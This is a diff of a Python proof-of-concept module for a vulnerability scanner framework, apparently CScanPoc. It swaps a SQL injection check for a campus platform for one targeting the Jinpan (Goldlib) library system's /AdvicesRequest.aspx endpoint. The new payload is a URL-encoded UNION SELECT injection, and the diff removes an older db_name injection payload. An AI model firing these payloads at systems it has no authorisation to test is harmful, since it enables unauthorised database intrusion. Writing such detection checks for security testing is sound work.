@@ -2,30 +2,27 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re
-from urllib.parse import quote
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yuysoft_0004'  # 平台漏洞编号，留空
-    name = '育友通用数字化校园平台 SQL注入'  # 漏洞名称
+    vuln_id = 'Goldlib_0001'  # 平台漏洞编号，留空
+    name = '金盘大型图书馆系统 SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION  # 漏洞类型
-    disclosure_date = '2015-04-02'  # 漏洞公布时间
+    disclosure_date = '2014-09-17'  # 漏洞公布时间
     desc = '''
-        育友通用数字化校园平台采用分布式权限管理，将整个信息平台的大量的信息维护任务，分配到各科室、个人，既调动了全体教师的使用热情，又可及时、高效的更新大量的信息。
-        育友通用数字化校园平台 SQL注入漏洞：
-        /Resource/search/SearchList.aspx?chk_Gra=1
+        金盘大型图书馆系统是金盘软件经过数年的努力全力退出的一代图书馆业务自动化管理软件系统。
+        金盘大型图书馆系统 /AdvicesRequest.aspx?DBKey=20004 SQL注射漏洞。
     '''  # 漏洞描述
-    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0105296'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=85140'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = '育友通用数字化校园平台'  # 漏洞应用名称
+    product = '金盘非书资料管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = 'e367bac1-1511-4038-9d74-ebc012d937d8'
+    poc_id = '3eff9ef2-c3cf-4b97-a43d-ba78a5cbbf34'
     author = '47bwy'  # POC编写者
     create_date = '2018-05-11'  # POC创建时间
 
@@ -52,12 +49,13 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             hh = hackhttp.hackhttp()
-            payload = '/Resource/search/SearchList.aspx?chk_Gra=1'
-            getdata = ')%20and%20db_name%281%29%3E0--'
+            payload = '/AdvicesRequest.aspx?DBKey=20004'
+            getdata = '%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2869%29%7C%7CCHR%2890%29%7C%7CCHR%28118%29%7C%7CCHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28113%29%7C%7CCHR%2884%29%7C%7CCHR%2885%29%7C%7CCHR%28102%29%7C%7CCHR%2882%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%20FROM%20DUAL--'
             url = self.target + payload + getdata
             code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'master' in res:
-                # security_hole(arg+payload)
+
+            if code == 200 and 'qzkpqEZvtwqTUfRqzqvq' in res:
+                #security_hole(arg+payload+'   :found sql Injection')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
